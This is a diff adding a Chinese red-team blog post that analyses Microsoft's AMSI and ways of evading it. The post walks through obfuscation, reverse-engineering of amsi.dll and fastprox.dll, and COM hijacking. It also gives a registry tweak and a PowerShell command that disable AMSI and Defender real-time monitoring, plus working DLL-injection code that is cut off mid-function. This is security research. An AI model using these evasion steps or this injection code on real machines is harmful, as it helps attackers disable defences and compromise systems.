@@ -1,0 +1,693 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <title>初窥AMSI攻防对抗 // Y4ph3tS blog</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.139.3">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Y4ph3tS" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.5b1fcc8902588589c4767187402a3c29f8b8d7a6fdef6d9f8f77045bb0d14fee.css" />
+    
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="初窥AMSI攻防对抗">
+  <meta name="twitter:description" content="什么是AMSI AMSI（Antimalware Scan Interface）全称反恶意软件扫描接口，是微软提供的一个接口，官方文档地址如下：
+https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal
+ASMI允许应用程序和服务与计算机上存在的任何反恶意软件产品集成。AMSI为终端用户及其数据，应用程序和工作负载提供了增强型的恶意软件防护。
+ASMI已集成到下列组件中：
+用户帐户控制或UAC（EXE，COM，MSI或ActiveX安装的高度） PowerShell（脚本，交互使用和动态代码评估） Windows脚本主机（wscript.exe和cscript.exe） JavaScript和VBScript Office VBA宏 AMSI的工作原理 官方给出的框架如下：
+当ASMI打开时，其他任何程序都可以调用它，同时任何经过注册的防护软件都可以让它执行任务。
+在实际工作过程中，举个例子，这个例子通过异或加密，用来下载互联网上的资源，
+我们可以通过直接在PS中进行输入来确保没有通过文件执行（这可能可以绕过部分防护软件的检测）这也时我们通常说的无文件攻击，因为以这种形式产生的攻击通常驻留在内存中，常规的查杀方法难以检测。
+微软给出了一个例子，通过PS执行了一个脚本，被ASMI拦截
+同时，AMSI还能应用到宏中，用于检测VBA和宏中是否携带有恶意操作
+上图经过了如下步骤：
+用户收到包含（恶意）宏的文档，该宏通过采用混淆，受密码保护的文件等技术来规避静态防病毒软件的扫描。
+然后，用户打开包含（恶意）宏的文档。如果文档在“受保护的视图”中打开，则用户单击“启用编辑”以退出“受保护的视图”。
+用户单击“启用宏”以允许宏运行。
+在运行宏时，VBA运行时使用循环缓冲区记录[1]数据和与Win32，COM和VBA API调用有关的参数。
+当观察到被认为具有高风险的特定Win32或COM API（也称为触发器）[2]时，宏执行将暂停，并将循环缓冲区的内容传递给AMSI。
+注册的AMSI反恶意软件服务提供者做出判决，以指示该宏行为是否是恶意的。
+如果该行为是非恶意的，则继续执行宏。
+否则，如果该行为是恶意的，则Microsoft Office将关闭该会话以响应警报[3]，并且AV可以隔离该文件。
+对抗方式的进化过程 了解了ASMI的原理，我们可以知道它的大致工作方式，同时也知道了作用原理
+特定字符匹配 以下为一段PS示例代码，现在是正常的代码，通常在攻防对抗的过程中会变得更为复杂：
+安全人员可以编写规则来检测其中的代码，例如对字符串的匹配，规则为匹配Write-Host&#39;pwnd！&#39;,这时运行这段代码就会被ASMI拦截。这时候基础的对抗就应运而生，如果目标使用的是上述的全字符匹配，黑客通过拆分的方式即可绕过
+代码仿真 这时候的简单规则被方便绕过，因此安全人员转而进行代码仿真，即执行语句的方式来判断是否有恶意行为，然而，由于拼接字符串的方法过于多样，黑客们又可以轻松绕过，例如非常常见的Base64编码，这种形式的简单加密手段在蚁剑中也很常见">
+
+    <meta property="og:url" content="https://yaphetszz.github.io/posts/asmi/">
+  <meta property="og:site_name" content="Y4ph3tS blog">
+  <meta property="og:title" content="初窥AMSI攻防对抗">
+  <meta property="og:description" content="什么是AMSI AMSI（Antimalware Scan Interface）全称反恶意软件扫描接口，是微软提供的一个接口，官方文档地址如下：
+https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal
+ASMI允许应用程序和服务与计算机上存在的任何反恶意软件产品集成。AMSI为终端用户及其数据，应用程序和工作负载提供了增强型的恶意软件防护。
+ASMI已集成到下列组件中：
+用户帐户控制或UAC（EXE，COM，MSI或ActiveX安装的高度） PowerShell（脚本，交互使用和动态代码评估） Windows脚本主机（wscript.exe和cscript.exe） JavaScript和VBScript Office VBA宏 AMSI的工作原理 官方给出的框架如下：
+当ASMI打开时，其他任何程序都可以调用它，同时任何经过注册的防护软件都可以让它执行任务。
+在实际工作过程中，举个例子，这个例子通过异或加密，用来下载互联网上的资源，
+我们可以通过直接在PS中进行输入来确保没有通过文件执行（这可能可以绕过部分防护软件的检测）这也时我们通常说的无文件攻击，因为以这种形式产生的攻击通常驻留在内存中，常规的查杀方法难以检测。
+微软给出了一个例子，通过PS执行了一个脚本，被ASMI拦截
+同时，AMSI还能应用到宏中，用于检测VBA和宏中是否携带有恶意操作
+上图经过了如下步骤：
+用户收到包含（恶意）宏的文档，该宏通过采用混淆，受密码保护的文件等技术来规避静态防病毒软件的扫描。
+然后，用户打开包含（恶意）宏的文档。如果文档在“受保护的视图”中打开，则用户单击“启用编辑”以退出“受保护的视图”。
+用户单击“启用宏”以允许宏运行。
+在运行宏时，VBA运行时使用循环缓冲区记录[1]数据和与Win32，COM和VBA API调用有关的参数。
+当观察到被认为具有高风险的特定Win32或COM API（也称为触发器）[2]时，宏执行将暂停，并将循环缓冲区的内容传递给AMSI。
+注册的AMSI反恶意软件服务提供者做出判决，以指示该宏行为是否是恶意的。
+如果该行为是非恶意的，则继续执行宏。
+否则，如果该行为是恶意的，则Microsoft Office将关闭该会话以响应警报[3]，并且AV可以隔离该文件。
+对抗方式的进化过程 了解了ASMI的原理，我们可以知道它的大致工作方式，同时也知道了作用原理
+特定字符匹配 以下为一段PS示例代码，现在是正常的代码，通常在攻防对抗的过程中会变得更为复杂：
+安全人员可以编写规则来检测其中的代码，例如对字符串的匹配，规则为匹配Write-Host&#39;pwnd！&#39;,这时运行这段代码就会被ASMI拦截。这时候基础的对抗就应运而生，如果目标使用的是上述的全字符匹配，黑客通过拆分的方式即可绕过
+代码仿真 这时候的简单规则被方便绕过，因此安全人员转而进行代码仿真，即执行语句的方式来判断是否有恶意行为，然而，由于拼接字符串的方法过于多样，黑客们又可以轻松绕过，例如非常常见的Base64编码，这种形式的简单加密手段在蚁剑中也很常见">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2020-11-21T02:01:32+08:00">
+    <meta property="article:modified_time" content="2020-11-21T02:01:32+08:00">
+    <meta property="article:tag" content="红队技术">
+    <meta property="article:tag" content="AMSI">
+    <meta property="article:tag" content="二进制">
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://yaphetszz.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="Y4ph3tS" /></a>
+      <span class="app-header-title">Y4ph3tS blog</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">主页</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/categories/">分类</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/">标签</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">关于</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/links/">友链</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/atta/">附件</a>
+      </nav>
+      <p>Valar Morghulis</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/yaphetszz" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-github" viewBox="0 0 24 24" fill="currentColor"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">初窥AMSI攻防对抗</h1>
+      <div class="post-meta">
+        <div>
+          <svg class="icon icon-calendar" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
+          Nov 21, 2020
+        </div>
+        <div>
+          <svg class="icon icon-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>clock</title><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+          
+          25032 Words - 
+          
+          50 min read
+        </div>
+          <p>创建时间: 2020-11-21 02:01</p>
+        
+           
+          
+          <p>最后修改时间: 2020-11-24 13:27</p>
+          
+        
+        <div>
+          <svg class="icon icon-tag" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>tag</title><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line></svg>
+              <a class="tag" href="https://yaphetszz.github.io/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/">红队技术</a>
+              <a class="tag" href="https://yaphetszz.github.io/tags/amsi/">AMSI</a>
+              <a class="tag" href="https://yaphetszz.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/">二进制</a>
+        </div>
+        <div>
+          <p></p>
+          <p>文章分类:    </p>
+              <a class="tag" href="https://yaphetszz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/">攻防渗透</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h2 id="什么是amsi">什么是AMSI</h2>
+<p>AMSI（Antimalware Scan Interface）全称反恶意软件扫描接口，是微软提供的一个接口，官方文档地址如下：</p>
+<p><a href="https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal">https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal</a></p>
+<p>ASMI允许应用程序和服务与计算机上存在的任何反恶意软件产品集成。AMSI为终端用户及其数据，应用程序和工作负载提供了增强型的恶意软件防护。</p>
+<p>ASMI已集成到下列组件中：</p>
+<ul>
+<li>用户帐户控制或UAC（EXE，COM，MSI或ActiveX安装的高度）</li>
+<li>PowerShell（脚本，交互使用和动态代码评估）</li>
+<li>Windows脚本主机（wscript.exe和cscript.exe）</li>
+<li>JavaScript和VBScript</li>
+<li>Office VBA宏</li>
+</ul>
+<h2 id="amsi的工作原理">AMSI的工作原理</h2>
+<p>官方给出的框架如下：</p>
+<p><img src="../amsi/1.png" alt="AMSI体系结构"></p>
+<p>当ASMI打开时，其他任何程序都可以调用它，同时任何经过注册的防护软件都可以让它执行任务。</p>
+<p>在实际工作过程中，举个例子，这个例子通过异或加密，用来下载互联网上的资源，</p>
+<p><img src="../amsi/2.png" alt="sample script encoded in Base64"></p>
+<p>我们可以通过直接在PS中进行输入来确保没有通过文件执行（这可能可以绕过部分防护软件的检测）这也时我们通常说的无文件攻击，因为以这种形式产生的攻击通常驻留在内存中，常规的查杀方法难以检测。</p>
+<p>微软给出了一个例子，通过PS执行了一个脚本，被ASMI拦截</p>
+<p><img src="../amsi/3.png" alt="Windows Defender detecting the AMSI test sample"></p>
+<p>同时，AMSI还能应用到宏中，用于检测VBA和宏中是否携带有恶意操作</p>
+<p><img src="../amsi/4.png" alt="AMSI integration with JavaScript/VBA"></p>
+<p>上图经过了如下步骤：</p>
+<ul>
+<li>
+<p>用户收到包含（恶意）宏的文档，该宏通过采用混淆，受密码保护的文件等技术来规避静态防病毒软件的扫描。</p>
+</li>
+<li>
+<p>然后，用户打开包含（恶意）宏的文档。如果文档在“受保护的视图”中打开，则用户单击“启用编辑”以退出“受保护的视图”。</p>
+</li>
+<li>
+<p>用户单击“启用宏”以允许宏运行。</p>
+</li>
+<li>
+<p>在运行宏时，VBA运行时使用循环缓冲区记录[1]数据和与Win32，COM和VBA API调用有关的参数。</p>
+</li>
+<li>
+<p>当观察到被认为具有高风险的特定Win32或COM API（也称为<em>触发器</em>）[2]时，宏执行将暂停，并将循环缓冲区的内容传递给AMSI。</p>
+</li>
+<li>
+<p>注册的AMSI反恶意软件服务提供者做出判决，以指示该宏行为是否是恶意的。</p>
+</li>
+<li>
+<p>如果该行为是非恶意的，则继续执行宏。</p>
+</li>
+<li>
+<p>否则，如果该行为是恶意的，则Microsoft Office将关闭该会话以响应警报[3]，并且AV可以隔离该文件。</p>
+</li>
+</ul>
+<h2 id="对抗方式的进化过程">对抗方式的进化过程</h2>
+<p>了解了ASMI的原理，我们可以知道它的大致工作方式，同时也知道了作用原理</p>
+<h3 id="特定字符匹配">特定字符匹配</h3>
+<p>以下为一段PS示例代码，现在是正常的代码，通常在攻防对抗的过程中会变得更为复杂：</p>
+<p><img src="../amsi/5.png" alt="an example of a malicious PowerShell script"></p>
+<p>安全人员可以编写规则来检测其中的代码，例如对字符串的匹配，规则为匹配<code>Write-Host'pwnd！'</code>,这时运行这段代码就会被ASMI拦截。这时候基础的对抗就应运而生，如果目标使用的是上述的全字符匹配，黑客通过拆分的方式即可绕过</p>
+<p><img src="../amsi/6.png" alt="an example of a dynamic script"></p>
+<h3 id="代码仿真">代码仿真</h3>
+<p>这时候的简单规则被方便绕过，因此安全人员转而进行代码仿真，即执行语句的方式来判断是否有恶意行为，然而，由于拼接字符串的方法过于多样，黑客们又可以轻松绕过，例如非常常见的Base64编码，这种形式的简单加密手段在蚁剑中也很常见</p>
+<p><img src="../amsi/7.png" alt="an example of script content in Base64"></p>
+<p>越来越常见的攻击方式也会加速策略的更新，安全研究人员又加上了对base64的解码仿真。</p>
+<p>进而，黑客又通过其他方式进行攻击，例如采取其他手段进行加密（异或加密）</p>
+<p><img src="../amsi/8.png" alt="an example of an algorithmic obfuscation script"></p>
+<p>这时又加大了检测的难度，于是安全人员又通过加密和混淆方式进行签名检测，再进行最终的行为检测，如果黑客将脚本的功能伪装成和正常脚本一样则又无法检测了。</p>
+<h2 id="常见绕过方式">常见绕过方式</h2>
+<h3 id="禁用amsi">禁用AMSI</h3>
+<p>首先最简单粗暴的办法肯定是禁用，只要AMSI不加载自然就不会拦截，其他杀软也同理，在退出或禁用状态下实时防护通常不会生效。查阅资料后可以通过设置注册表键值实现。正常情况下在拦截后我们可以看到事件查看器中留下的记录如下图所示：</p>
+<p><img src="../amsi/37.png" alt="image-20201123173413905"></p>
+<p>在部分版本的Windows中，可以将HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable的表项值置为0</p>
+<p>也可以直接在PS中执行命令关闭WD的实时防护</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Set-MpPreference -DisableRealtimeMonitoring $true
+</span></span></code></pre></div><p>关闭时的事件也会被记录：</p>
+<p><img src="../amsi/38.png" alt="image-20201123174159166"></p>
+<h3 id="拼接混淆">拼接混淆</h3>
+<p>可以看到在上文中的第一个例子即是通过了加密混淆的，但是仍然被ASMI查杀了，因此在对抗的过程中出现了新的对抗方式。以下主要分析一些常见的分析方式：</p>
+<p>上述方式均为官方文档中所描述的，在实战过程中，还是需要在自己的机器上跑一遍，在17763版本的win10上默认规则下可以看到之前的拼接方式仍然有效</p>
+<p><img src="../amsi/9.png" alt=""></p>
+<p>接下来在18363的机器上进行测试,由于这个版本不直接拦截amsiutils，因此使用Invoke-mimikatz进行测试</p>
+<p><img src="../amsi/11.png" alt=""></p>
+<p>但是很容易发现在实际执行的过程中并不会如此简单，可以尝试其他方式绕过，比如XOR加密，或者base64加密。</p>
+<h3 id="加密混淆">加密混淆</h3>
+<h4 id="base64加密">Base64加密</h4>
+<p>这时base64中最简单的加密样例</p>
+<p><img src="../amsi/39.png" alt="image-20201123181838255"></p>
+<p>在实际过程中可能更为复杂，以下为一个样本中的加密方式：</p>
+<p><img src="../amsi/40.png" alt=""></p>
+<p>从图上可以很清晰的知道存放了一段base64数据，首先将base64数据解密，使用gzip解压，解压的数据进行执行。</p>
+<h3 id="com劫持">COM劫持</h3>
+<p>寻找优先加载并无效的COM表项，在注册表中将Provider的路径指向到无效路径。这样，Powershell中的AMSI功能将无法加载，从而失效。</p>
+<p><img src="../amsi/19.png" alt="img"></p>
+<p>劫持之后的效果</p>
+<p><img src="../amsi/20.png" alt="img"></p>
+<p>不过这个漏洞在2017年5月份的16232已经修复了，那么接下来我们就来探索一下高级绕过方式。</p>
+<h2 id="高级绕过方式的探索与研究">高级绕过方式的探索与研究</h2>
+<p>在研究高级绕过方式之前，我们先对AMSI进一步研究，结合之前的绕过方式，来着重分析AMSI的dll文件，我们来研究一下拦截机制，在分析的过程中发现power shell在启动时调用了AMSI.dll。</p>
+<p><img src="../amsi/13.png" alt=""></p>
+<p>通过dll analyzer打开，在export中看到导出的函数</p>
+<p><img src="../amsi/21.png" alt="image-20201119165700583"></p>
+<p><code> AmsiCloseSession AmsiInitialize AmsiOpenSession AmsiScanBuffer AmsiScanString AmsiUacInitialize AmsiUacScan AmsiUacUninitialize AmsiUninitialize DllCanUnloadNow DllGetClassObject DllRegisterServer DllUnregisterServer</code></p>
+<p>对应地，在IDA中调试时也可以获取到Export的函数</p>
+<p><img src="../amsi/22.png" alt="image-20201119174152237"></p>
+<p>根据官方文档我们可以得到扫描缓冲区的函数为AmsiScanBuffer和AmsiScanString以及AmsiUacScan</p>
+<p>另外根据以下PS指令列出了其他组件</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$UserPEs = Get-CimInstance -ClassName CIM_DataFile -Filter <span style="color:#e6db74">&#39;Drive = &#34;C:&#34; and (Extension = &#34;exe&#34; or Extension = &#34;dll&#34;)&#39;</span> -Property <span style="color:#e6db74">&#39;Name&#39;</span> | Select -ExpandProperty Name
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$AMSIReferences1 = $UserPEs | % { Select-String -Encoding ascii -LiteralPath $_ -Pattern <span style="color:#e6db74">&#39;amsi\.dll&#39;</span> }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$AMSIReferences2 = $UserPEs | % { Select-String -Encoding unicode -LiteralPath $_ -Pattern <span style="color:#e6db74">&#39;amsi\.dll&#39;</span> }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$AMSIReferences1.Path
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$AMSIReferences2.Path
+</span></span></code></pre></div><p>上述代码的作用为通过WMI来枚举所有的exe和dll，可以通过Select-String方式来获取文件中包含AMSI.dll的文件,由于列出的文件过多（主要是重复），因此就筛选去重了一下得到以下七个：</p>
+<p><code> %windir%\System32\consent.exe %windir%\System32\jscript.dll %windir%\System32\vbscript.dll %windir%\System32\wbem\fastprox.dll %windir%\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll %windir%\Microsoft.NET\Framework64\v4.0.30319\clr.dll %Program Files%\Common Files\microsoft shared\VBA\VBA7.1\VBE7.DLL</code></p>
+<p>其中consent.exe用于用户帐户控制，和UAC相关；jscript和vbscript用于控制vbs和js脚本；fastprox.dll则是WMI中的一个组件；System.Management.Automation.dll用于对powershell的控制；clr属于.NET的运行环境；VBE7.dll是对Office中VBA宏的支持。</p>
+<p>由此可见AMSI深入到了各个系统组件中，包括调用的脚本，宏和powershell指令等。</p>
+<p>接下来具体看看其他文件，由于不知道WMI如何调用，因此可以通过Get-Process | Where-Object { $_.Modules.ModuleName -contains &lsquo;fastprox.dll&rsquo; }命令来列出哪些进程加载了fastprox.dll</p>
+<p><img src="../amsi/23.png" alt="image-20201123112809412"></p>
+<p>以进程KillerAnalyticsService为例，KillerAnalyticsService是我的微星笔记本自带的Killer网卡的分析服务，可以看到导出的服务中只有一项：</p>
+<p><img src="../amsi/24.png" alt="image-20201123114001960"></p>
+<p>接下来试试系统进程（这个应该会多一些）由此可见与WMI交互的进程都会调用这个dll</p>
+<p><img src="../amsi/25.png" alt="image-20201123114107888"></p>
+<p>既然我们通过对文件中字符串的搜索发现了AMSI.dll那就进一步跟一下fastprox.dll，在sub_180031AE8中找到了ASMI的调用</p>
+<p><img src="../amsi/26.png" alt="image-20201123114626918"></p>
+<p>我们可以看到有非常多的各种方法执行后都会加载该函数，在IDA的图表视图中较为复杂</p>
+<p><img src="../amsi/27.png" alt="image-20201123142437474"></p>
+<p>不过在对上级函数的分析中发现只有在当前进程不是由wmiprvse.exe发起时才会调用AMSI<img src="../amsi/28.png" alt="image-20201123143010682"></p>
+<p>接着来着重点AMSI调用部分</p>
+<p><img src="../amsi/29.png" alt="image-20201123114719572"></p>
+<p>在跟踪相关函数后发现其中还有不少函数都会调JAmsiRunScanner，但主要还是JAmsiProcessor会调用JAmsiRunScanner，因此推测很可能由该函数传入操作，进一步对比后发现了其他函数均对应IWbemServices interface的相关方法，在IWbemServices的<a href="https://docs.microsoft.com/en-us/windows/win32/api/wbemcli/nn-wbemcli-iwbemservices">官方文档</a>中有详细介绍，唯独没有Put方法对应，大概率就是通过这个方法传入扫描内容了。</p>
+<p>新建一个事件监听器进行测试</p>
+<p><img src="../amsi/30.png" alt="image-20201123152403030"></p>
+<p>创建一个本地CIM会话来枚举远程WMI连接，完成WMI交互，然后停止捕捉，再然后通过PS来识别任意WMI事件</p>
+<p><img src="../amsi/31.png" alt="image-20201123152722309"></p>
+<p><img src="../amsi/32.png" alt="image-20201123152748680"></p>
+<p>通过对事件的识别，我们发现其中的某由svchost发起的进程包含了WMI事件（这个识别起来是真的不容易，太难了）通常系统会经常使用WMI进行一些操作，但是不一定会被记录，在继续跟进了DLL后发现需要经过一系列的判断才会进行记录</p>
+<p><img src="../amsi/33.png" alt="image-20201123160347236"></p>
+<p><img src="../amsi/34.png" alt="image-20201123160319191"></p>
+<p>这个函数有一个神奇的方法名和一连串的比较</p>
+<p><img src="../amsi/35.png" alt="image-20201123160440694"></p>
+<p>当只有特定值匹配时才会记录</p>
+<p>特定值为</p>
+<p><code> 788C9917h,96B23E8Ah,0B8DA804Eh,0C0B29B3Dh,0D16F4088h,0D61D2EA7h,0EF726924h,0F837EFC3h</code></p>
+<p>但是因为逻辑过于复杂，加上本人才疏学浅并没有发现什么规律，在查阅资料后发现这个其实是对WMI操作的CRC32的校验，这个暂时还没有太过深入的研究</p>
+<p><img src="../amsi/36.png" alt="Image for post"></p>
+<p>最终也得到了几个值，其中前半部分相同，后面有几个不同，因此推测不同的系统对WMI操作的CRC32校验和比较也不同，是一个白名单的制度，对白名单中的值不进行记录，因此我们可以通过构造特殊的payload，通过白名单校验和的方式绕过AMSI的检测。</p>
+<h3 id="dll注入">DLL注入</h3>
+<p>那么为什么这样就不拦截了呢，</p>
+<p>通过对官方文档的进一步阅读，发现了其实是调用AmsiScanBuffer这个函数来实现的</p>
+<pre tabindex="0"><code>HRESULT AmsiScanBuffer(
+HAMSICONTEXT amsiContext,
+PVOID        buffer,
+ULONG        length,
+LPCWSTR      contentName,
+HAMSISESSION amsiSession,
+AMSI_RESULT  *result
+);
+</code></pre><p>传递给AmsiScanBuffer函数的最后一个参数是一个枚举类型指针名字为result，这个result将决定执行这个脚本是否是恶意。</p>
+<pre tabindex="0"><code>typedef enum AMSI_RESULT {
+  AMSI_RESULT_CLEAN,
+  AMSI_RESULT_NOT_DETECTED,
+  AMSI_RESULT_BLOCKED_BY_ADMIN_START,
+  AMSI_RESULT_BLOCKED_BY_ADMIN_END,
+  AMSI_RESULT_DETECTED
+};
+</code></pre><p>如果我们可以控制该函数的返回结果，比如将result设置为一个固定的值，这个值在执行普通文件和恶意文件时显然不同，只需要一直返回正常值理论上就不会触发拦截。</p>
+<p>在分析过程中发现这个DLL并没有其他方式去进行额外保护，而目前多数杀软都会对自己的进程进行保护，通常通过内核驱动保护的方式实现，而amsi.dll并没有类似保护，接下来就进行深入一些的研究。</p>
+<p>首先针对dll想到的办法就是dll注入，github上有一个非常好用的<a href="https://github.com/fdiskyou/injectAllTheThings">injectAllTheThings</a>项目.</p>
+<p>不过也可以自己编写，在demo演示上位了方便没有采用庞大的项目，找了一个大佬写好的现成代码，可参考以下示例：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>include &lt;iostream&gt;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>include &lt;windows.h&gt;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>include &lt;TlHelp32.h&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//Opens a handle to process then write to process with LoadLibraryA and execute thread</span>
+</span></span><span style="display:flex;"><span>BOOL InjectDll(DWORD procID, <span style="color:#66d9ef">char</span>* dllName) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> fullDllName[MAX_PATH];
+</span></span><span style="display:flex;"><span>    LPVOID loadLibrary;
+</span></span><span style="display:flex;"><span>    LPVOID remoteString;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (procID == <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (hProc == INVALID_HANDLE_VALUE) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    GetFullPathNameA(dllName, MAX_PATH, fullDllName, NULL);
+</span></span><span style="display:flex;"><span>    std::cout &lt;&lt; <span style="color:#e6db74">&#34;[+] Aquired full DLL path: &#34;</span> &lt;&lt; fullDllName &lt;&lt; std::endl;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    loadLibrary = (LPVOID)GetProcAddress(GetModuleHandle(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>), <span style="color:#e6db74">&#34;LoadLibraryA&#34;</span>);
+</span></span><span style="display:flex;"><span>    remoteString = VirtualAllocEx(hProc, NULL, strlen(fullDllName), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    WriteProcessMemory(hProc, remoteString, fullDllName, strlen(fullDllName), NULL);
+</span></span><span style="display:flex;"><span>    CreateRemoteThread(hProc, NULL, NULL, (LPTHREAD_START_ROUTINE)loadLibrary, (LPVOID)remoteString, NULL, NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    CloseHandle(hProc);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//Iterate all process until the name we&#39;re searching for matches</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//Then return the process ID</span>
+</span></span><span style="display:flex;"><span>DWORD GetProcIDByName(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span>* procName) {
+</span></span><span style="display:flex;"><span>    HANDLE hSnap;
+</span></span><span style="display:flex;"><span>    BOOL done;
+</span></span><span style="display:flex;"><span>    PROCESSENTRY32 procEntry;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    ZeroMemory(&amp;procEntry, <span style="color:#66d9ef">sizeof</span>(PROCESSENTRY32));
+</span></span><span style="display:flex;"><span>    procEntry.dwSize = <span style="color:#66d9ef">sizeof</span>(PROCESSENTRY32);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    done = Process32First(hSnap, &amp;procEntry);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (_strnicmp(procEntry.szExeFile, procName, <span style="color:#66d9ef">sizeof</span>(procEntry.szExeFile)) == <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> procEntry.th32ProcessID;
+</span></span><span style="display:flex;"><span>        }
